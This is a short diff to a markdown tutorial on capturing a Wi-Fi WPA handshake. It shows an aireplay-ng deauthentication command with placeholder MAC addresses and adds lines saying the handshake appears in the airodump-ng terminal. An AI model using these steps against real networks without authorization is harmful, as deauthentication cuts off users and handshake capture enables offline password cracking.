@@ -40,3 +40,6 @@ Open another terminal
 > aireplay-ng --deauth [#deauthPackets] -a [NetworkMac] -c [TargetMac] [Interface]
 > ``` 
 > use deauthPackets = 4 to send deauth attack for less time
+
+### You can find Handshake on the airodum-ng terminal
+now you can close the process because the handshake has been captured
